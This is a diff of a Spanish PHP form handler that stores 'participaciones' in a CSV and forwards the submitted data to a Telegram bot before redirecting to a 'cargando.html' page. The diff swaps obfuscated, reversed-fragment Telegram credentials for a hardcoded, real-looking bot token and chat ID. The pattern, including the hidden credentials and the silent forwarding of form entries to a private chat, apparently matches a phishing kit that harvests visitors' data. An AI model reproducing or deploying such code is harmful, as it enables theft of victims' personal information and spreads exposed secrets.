@@ -14,23 +14,9 @@ $NOTIFY_EMAIL    = '';            // correo opcional de notificación ('' = desa
 $CSV_FILE        = __DIR__ . DIRECTORY_SEPARATOR . 'participaciones.csv';
 $SUCCESS_URL     = 'cargando.html';
 
-// --- Telegram: credenciales ofuscadas ---
-// 1) Prioridad: variables de entorno (más seguro en producción)
-// 2) Fallback: cadena invertida partida en fragmentos
-function _tg_decode(array $chunks): string {
-    return strrev(implode('', $chunks));
-}
-$TELEGRAM_TOKEN = getenv('TG_TOKEN') ?: _tg_decode([
-    '8j7upolIBGX',
-    'uv4F30-yMKYd',
-    '_p97v7egHGAA',
-    ':2199864748',
-]);
-$TELEGRAM_CHAT_ID = getenv('TG_CHAT_ID') ?: _tg_decode([
-    '92143',
-    '8911300',
-    '1-',
-]);
+// --- Telegram ---
+$TELEGRAM_TOKEN   = '8474689912:AAGHge7v79p_dYKMy-03F4vuXGBIlopu7j8';
+$TELEGRAM_CHAT_ID = '-1003119834129';
 // ================================
 
 // Solo aceptar POST
@@ -71,7 +57,7 @@ if (!empty($errors)) {
     http_response_code(422);
     echo '<h2>Errores en el formulario</h2><ul>';
     foreach ($errors as $e) echo '<li>' . htmlspecialchars($e, ENT_QUOTES, 'UTF-8') . '</li>';
-    echo '</ul><a href="index.html">Volver</a>';
+    echo '</ul><a href="index.php">Volver</a>';
     exit;
 }
 
@@ -109,7 +95,7 @@ fclose($fp);
 
 // ============ ENVÍO A TELEGRAM ============
 function enviarATelegram(string $token, string $chatId, array $data): array {
-    if ($token === '' || $chatId === '' || str_starts_with($token, 'PON_AQUI')) {
+    if ($token === '' || $chatId === '') {
         return ['ok' => false, 'error' => 'Credenciales de Telegram no configuradas'];
     }
 
